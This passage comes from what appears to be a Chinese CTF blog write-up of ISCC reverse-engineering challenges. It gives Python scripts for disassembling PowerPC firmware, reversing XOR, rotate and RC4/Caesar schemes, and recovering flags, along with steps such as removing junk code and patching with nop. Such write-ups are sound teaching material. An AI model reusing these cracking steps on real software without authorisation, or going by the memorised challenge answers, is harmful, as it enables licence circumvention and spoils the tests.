class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节数组</span></span><br><span class="line">    byte_data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line">    <span class="keyword">return</span> address, byte_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disassemble_ppc</span>(<span class="params">address, code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用Capstone反汇编PowerPC代码&quot;&quot;&quot;</span></span><br><span class="line">    md = Cs(CS_ARCH_PPC, CS_MODE_32 + CS_MODE_BIG_ENDIAN)</span><br><span class="line">    md.detail = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    assembly = []</span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(code, address):</span><br><span class="line">        assembly.append(<span class="string">f&quot;0x<span class="subst">&#123;insn.address:08X&#125;</span>:\t<span class="subst">&#123;insn.mnemonic&#125;</span>\t<span class="subst">&#123;insn.op_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> assembly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 收集所有代码段</span></span><br><span class="line">    code_segments = []</span><br><span class="line">    <span class="keyword">for</span> srec <span class="keyword">in</span> s_records:</span><br><span class="line">        addr, data = parse_s_record(srec)</span><br><span class="line">        <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> data:</span><br><span class="line">            code_segments.append((addr, data))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按地址排序</span></span><br><span class="line">    code_segments.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 合并连续的代码段</span></span><br><span class="line">    merged_code = <span class="built_in">bytearray</span>()</span><br><span class="line">    current_addr = <span class="literal">None</span></span><br><span class="line">    last_addr = <span class="literal">None</span></span><br><span class="line">    last_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr, data <span class="keyword">in</span> code_segments:</span><br><span class="line">        <span class="keyword">if</span> last_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 第一个段</span></span><br><span class="line">            merged_code.extend(data)</span><br><span class="line">            current_addr = addr</span><br><span class="line">            last_addr = addr + <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> addr == last_addr:</span><br><span class="line">                <span class="comment"># 连续段</span></span><br><span class="line">                merged_code.extend(data)</span><br><span class="line">                last_addr += <span class="built_in">len</span>(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 不连续段，先反汇编已合并的</span></span><br><span class="line">                <span class="keyword">if</span> merged_code:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n=== 段地址: 0x<span class="subst">&#123;current_addr:08X&#125;</span>-0x<span class="subst">&#123;last_addr:08X&#125;</span> ===&quot;</span>)</span><br><span class="line">                    asm = disassemble_ppc(current_addr, merged_code)</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> asm:</span><br><span class="line">                        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 开始新段</span></span><br><span class="line">                merged_code = <span class="built_in">bytearray</span>(data)</span><br><span class="line">                current_addr = addr</span><br><span class="line">                last_addr = addr + <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反汇编最后一段</span></span><br><span class="line">    <span class="keyword">if</span> merged_code:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n=== 段地址: 0x<span class="subst">&#123;current_addr:08X&#125;</span>-0x<span class="subst">&#123;last_addr:08X&#125;</span> ===&quot;</span>)</span><br><span class="line">        asm = disassemble_ppc(current_addr, merged_code)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> asm:</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行后看到汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">D:\PyCharmProjects\aaa\.venv\Scripts\python.exe &quot;C:\Users\Lenovo\Documents\WeChat Files\wxid_ummbals4orzj22\FileStorage\File\2025-05\123.py&quot; </span><br><span class="line"></span><br><span class="line">=== 段地址: 0x0000050C-0x00000684 ===</span><br><span class="line">0x0000050C:stwur1, -0x30(r1)</span><br><span class="line">0x00000510:stwr31, 0x2c(r1)</span><br><span class="line">0x00000514:mrr31, r1</span><br><span class="line">0x00000518:stwr3, 0xc(r31)</span><br><span class="line">0x0000051C:stwr4, 8(r31)</span><br><span class="line">0x00000520:lir9, 0</span><br><span class="line">0x00000524:stwr9, 0x1e(r31)</span><br><span class="line">0x00000528:b0x654</span><br><span class="line">0x0000052C:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000530:clrlwir9, r9, 0x1f</span><br><span class="line">0x00000534:cmpwicr7, r9, 0</span><br><span class="line">0x00000538:bf4*cr7+eq, 0x590</span><br><span class="line">0x0000053C:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000540:lwzr10, 0xc(r31)</span><br><span class="line">0x00000544:addr9, r10, r9</span><br><span class="line">0x00000548:lbzr9, 0(r9)</span><br><span class="line">0x0000054C:extsbr10, r9</span><br><span class="line">0x00000550:lisr9, 0x1002</span><br><span class="line">0x00000554:lwzr8, 0x18(r9)</span><br><span class="line">0x00000558:lwzr9, 0x1e(r31)</span><br><span class="line">0x0000055C:addr9, r8, r9</span><br><span class="line">0x00000560:lbzr9, 0(r9)</span><br><span class="line">0x00000564:addir9, r9, 2</span><br><span class="line">0x00000568:clrlwir9, r9, 0x18</span><br><span class="line">0x0000056C:extsbr9, r9</span><br><span class="line">0x00000570:xorr9, r10, r9</span><br><span class="line">0x00000574:extsbr8, r9</span><br><span class="line">0x00000578:lwzr9, 0x1e(r31)</span><br><span class="line">0x0000057C:lwzr10, 8(r31)</span><br><span class="line">0x00000580:addr9, r10, r9</span><br><span class="line">0x00000584:clrlwir10, r8, 0x18</span><br><span class="line">0x00000588:stbr10, 0(r9)</span><br><span class="line">0x0000058C:b0x648</span><br><span class="line">0x00000590:lwzr10, 0x1e(r31)</span><br><span class="line">0x00000594:lisr9, 0x5555</span><br><span class="line">0x00000598:orir9, r9, 0x5556</span><br><span class="line">0x0000059C:mulhwr8, r10, r9</span><br><span class="line">0x000005A0:srawir9, r10, 0x1f</span><br><span class="line">0x000005A4:subr9, r8, r9</span><br><span class="line">0x000005A8:mullir9, r9, 3</span><br><span class="line">0x000005AC:subr9, r10, r9</span><br><span class="line">0x000005B0:cmpwicr7, r9, 0</span><br><span class="line">0x000005B4:bf4*cr7+eq, 0x60c</span><br><span class="line">0x000005B8:lwzr9, 0x1e(r31)</span><br><span class="line">0x000005BC:lwzr10, 0xc(r31)</span><br><span class="line">0x000005C0:addr9, r10, r9</span><br><span class="line">0x000005C4:lbzr9, 0(r9)</span><br><span class="line">0x000005C8:extsbr10, r9</span><br><span class="line">0x000005CC:lisr9, 0x1002</span><br><span class="line">0x000005D0:lwzr8, 0x18(r9)</span><br><span class="line">0x000005D4:lwzr9, 0x1e(r31)</span><br><span class="line">0x000005D8:addr9, r8, r9</span><br><span class="line">0x000005DC:lbzr9, 0(r9)</span><br><span class="line">0x000005E0:addir9, r9, 5</span><br><span class="line">0x000005E4:clrlwir9, r9, 0x18</span><br><span class="line">0x000005E8:extsbr9, r9</span><br><span class="line">0x000005EC:xorr9, r10, r9</span><br><span class="line">0x000005F0:extsbr8, r9</span><br><span class="line">0x000005F4:lwzr9, 0x1e(r31)</span><br><span class="line">0x000005F8:lwzr10, 8(r31)</span><br><span class="line">0x000005FC:addr9, r10, r9</span><br><span class="line">0x00000600:clrlwir10, r8, 0x18</span><br><span class="line">0x00000604:stbr10, 0(r9)</span><br><span class="line">0x00000608:b0x648</span><br><span class="line">0x0000060C:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000610:lwzr10, 0xc(r31)</span><br><span class="line">0x00000614:addr9, r10, r9</span><br><span class="line">0x00000618:lbzr8, 0(r9)</span><br><span class="line">0x0000061C:lisr9, 0x1002</span><br><span class="line">0x00000620:lwzr10, 0x18(r9)</span><br><span class="line">0x00000624:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000628:addr9, r10, r9</span><br><span class="line">0x0000062C:lbzr10, 0(r9)</span><br><span class="line">0x00000630:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000634:lwzr7, 8(r31)</span><br><span class="line">0x00000638:addr9, r7, r9</span><br><span class="line">0x0000063C:xorr10, r8, r10</span><br><span class="line">0x00000640:clrlwir10, r10, 0x18</span><br><span class="line">0x00000644:stbr10, 0(r9)</span><br><span class="line">0x00000648:lwzr9, 0x1e(r31)</span><br><span class="line">0x0000064C:addir9, r9, 1</span><br><span class="line">0x00000650:stwr9, 0x1e(r31)</span><br><span class="line">0x00000654:lwzr9, 0x1e(r31)</span><br><span class="line">0x00000658:cmpwicr7, r9, 0x1e</span><br><span class="line">0x0000065C:bf4*cr7+gt, 0x52c</span><br><span class="line">0x00000660:lwzr9, 8(r31)</span><br><span class="line">0x00000664:addir9, r9, 0x1f</span><br><span class="line">0x00000668:lir10, 0</span><br><span class="line">0x0000066C:stbr10, 0(r9)</span><br><span class="line">0x00000670:nop</span><br><span class="line">0x00000674:addir11, r31, 0x30</span><br><span class="line">0x00000678:lwzr31, -4(r11)</span><br><span class="line">0x0000067C:mrr1, r11</span><br><span class="line">0x00000680:blr</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br></pre></td></tr></table></figure><p>依照这个逻辑再写一个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">input_data, output</span>):</span><br><span class="line">    key = <span class="string">&quot;ISCC&#123;s_ale_ru_upatu_prrlaullre_&#125;&quot;</span><span class="comment">#密钥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> (i &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            output[i] = input_data[i] ^ (<span class="built_in">ord</span>(key[i]) + <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            output[i] = input_data[i] ^ (<span class="built_in">ord</span>(key[i]) + <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output[i] = input_data[i] ^ <span class="built_in">ord</span>(key[i])</span><br><span class="line">    <span class="comment">#output.append(0)  # 添加末尾的 null 终止符（但 Python 字符串不需要）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    v = [<span class="number">45</span>, <span class="number">117</span>, <span class="number">43</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">19</span>, <span class="number">88</span>, <span class="number">33</span>, <span class="number">23</span>, <span class="number">66</span>, <span class="number">83</span>, <span class="number">48</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">94</span>, <span class="number">34</span>, <span class="number">47</span>, <span class="number">60</span>, <span class="number">56</span>, <span class="number">69</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">55</span>, <span class="number">45</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">56</span>, <span class="number">52</span>, <span class="number">17</span>]<span class="comment">#密文</span></span><br><span class="line">    t = [<span class="number">0</span>] * <span class="number">30</span>  <span class="comment">#</span></span><br><span class="line">    encrypt(v, t)</span><br><span class="line">    <span class="comment"># 转换为字符并打印</span></span><br><span class="line">    decrypted_str = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> t])</span><br><span class="line">    <span class="built_in">print</span>(decrypted_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/../images/week7-re-ISCC.assets/image-20250520203312869.png" alt="image-20250520203312869"></p><p>运行出结果，加上ISCC{}</p><p>就是flag了</p><h1 id="greeting"><a href="#greeting" class="headerlink" title="greeting"></a>greeting</h1><p>先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521190511437.png" alt="image-20250521190511437"></p><p>找一下main函数</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521190636354.png" alt="image-20250521190636354"></p><p>跟进v5，看到有爆红的部分，去花，别忘了按C编译一下</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521190719878.png" alt="image-20250521190719878"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250521190848514.png" alt="image-20250521190848514"></p><p>类似如上</p><p>重新看一下main函数，还有爆红的部分，那就继续上面的操作</p><p>操作完成后，再看一下main函数</p><p>找到 <strong>加密前的明文</strong>，对应的密文就在内存中被读取并解密成 <code>xmmword_14001B390</code></p><p>找到使这段代码生成 <code>xmmword_14001B390</code> 的 <code>v30[i]</code></p><p>那我们就跟进这个函数</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521192404434.png" alt="image-20250521192404434"></p><p>看到密文</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521192706550.png" alt="image-20250521192706550"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ror8</span>(<span class="params">val, shift</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 8-bit 循环右移 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ((val &gt;&gt; shift) | (val &lt;&lt; (<span class="number">8</span> - shift))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data</span>):</span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 1. 计算位移量 (i - 5*(i//5)) % 8</span></span><br><span class="line">        shift = (i - <span class="number">5</span> * (i // <span class="number">5</span>)) % <span class="number">8</span></span><br><span class="line">        <span class="comment"># 2. 循环右移 (还原ROL)</span></span><br><span class="line">        rotated = ror8(encrypted_data[i], shift)</span><br><span class="line">        <span class="comment"># 3. XOR (i + 90) 解密</span></span><br><span class="line">        decrypted_byte = rotated ^ (i + <span class="number">90</span>)</span><br><span class="line">        decrypted.append(decrypted_byte)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line">encrypted_si128 = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x13</span>,<span class="number">0x10</span>,<span class="number">0x7C</span>,<span class="number">0xF0</span>,<span class="number">0x52</span>,<span class="number">0x26</span>,<span class="number">0x86</span>,<span class="number">0x24</span>,<span class="number">0xD8</span>,<span class="number">0xB2</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x40</span>,<span class="number">0xB1</span>,<span class="number">0x40</span>,<span class="number">0x14</span></span><br><span class="line">])</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = decrypt(encrypted_si128)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密结果（Hex）:&quot;</span>, decrypted_data.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密结果（ASCII）:&quot;</span>, decrypted_data.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><p>当然，也可以转成hex后面用赛博厨子也可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ror8</span>(<span class="params">val, shift</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;8-bit 循环右移&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ((val &gt;&gt; shift) | (val &lt;&lt; (<span class="number">8</span> - shift))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data</span>):</span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 1. 计算位移量 (i - 5*(i//5)) % 8</span></span><br><span class="line">        shift = (i - <span class="number">5</span> * (i // <span class="number">5</span>)) % <span class="number">8</span></span><br><span class="line">        <span class="comment"># 2. 循环右移 (还原ROL)</span></span><br><span class="line">        rotated = ror8(encrypted_data[i], shift)</span><br><span class="line">        <span class="comment"># 3. XOR (i + 90) 解密</span></span><br><span class="line">        decrypted_byte = rotated ^ (i + <span class="number">90</span>)</span><br><span class="line">        decrypted.append(decrypted_byte)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">encrypted_si128 = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x7C</span>, <span class="number">0xF0</span>, <span class="number">0x52</span>, <span class="number">0x26</span>, <span class="number">0x86</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xB2</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x40</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0x14</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = decrypt(encrypted_si128)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅输出十六进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密结果（Hex）:&quot;</span>, decrypted_data.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p><img src="/../images/week7-re-ISCC.assets/image-20250521195649417.png" alt="image-20250521195649417"></p><p>再看一下上面的代码的逻辑</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521201047683.png" alt="image-20250521201047683"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250521201052583.png" alt="image-20250521201052583"></p><p>si128是目标明文</p><h1 id="有趣的小游戏"><a href="#有趣的小游戏" class="headerlink" title="有趣的小游戏"></a>有趣的小游戏</h1><h1 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h1><h2 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h2><p>先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521204130182.png" alt="image-20250521204130182"></p><p>看一下关键函数</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521205025490.png" alt="image-20250521205025490"></p><p>跟进黄色部分，进去之后tap，修复一下函数表</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521205437703.png" alt="image-20250521205437703"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250521205502251.png" alt="image-20250521205502251"></p><p>进去nop掉</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521210242319.png" alt="image-20250521210242319"></p><p>去完以后，提取数据</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521211631146.png" alt="image-20250521211631146"></p><p>上面看到密钥是<code>SecretKey</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 硬编码的44字节密文</span></span><br><span class="line">encrypted_data = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xB8</span>, <span class="number">0x2E</span>, <span class="number">0x47</span>, <span class="number">0xDD</span>, <span class="number">0x72</span>, <span class="number">0x1C</span>, <span class="number">0xA2</span>, <span class="number">0xDE</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x46</span>, <span class="number">0x9C</span>, <span class="number">0xF0</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0xCC</span>, <span class="number">0xE6</span>, <span class="number">0xC9</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0x9A</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0x4A</span>, <span class="number">0x6B</span>, <span class="number">0xB9</span>, <span class="number">0xE8</span>, <span class="number">0xBF</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0xE3</span>, <span class="number">0x3F</span>, <span class="number">0xC7</span>, <span class="number">0x15</span>, <span class="number">0x67</span>, <span class="number">0x17</span>, <span class="number">0xDB</span>, <span class="number">0x91</span>, <span class="number">0xF3</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0x74</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. RC4解密（密钥=&quot;SecretKey&quot;）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    cipher = ARC4.new(<span class="string">b&quot;SecretKey&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">rc4_decrypted = rc4_decrypt(encrypted_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RC4 Decrypted: <span class="subst">&#123;rc4_decrypted.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 凯撒解密（位移3，仅处理字母）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        c = <span class="built_in">chr</span>(byte)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted = base + (<span class="built_in">ord</span>(c) - base - <span class="number">3</span>) % <span class="number">26</span>  <span class="comment"># 反向位移3</span></span><br><span class="line">            result.append(decrypted)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            decrypted = base + (<span class="built_in">ord</span>(c) - base - <span class="number">3</span>) % <span class="number">26</span></span><br><span class="line">            result.append(decrypted)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(byte)  <span class="comment"># 非字母直接保留</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">caesar_decrypted = caesar_decrypt(rc4_decrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Caesar Decrypted: <span class="subst">&#123;caesar_decrypted.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. XOR解密（假设HIWORD(a1)=0x41）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key=<span class="number">0x41</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line">xor_decrypted = xor_decrypt(caesar_decrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;XOR Decrypted (key=0x41): <span class="subst">&#123;xor_decrypted&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试直接解码（可能是Flag）</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = xor_decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = flag.replace(<span class="string">&quot;A&quot;</span>, <span 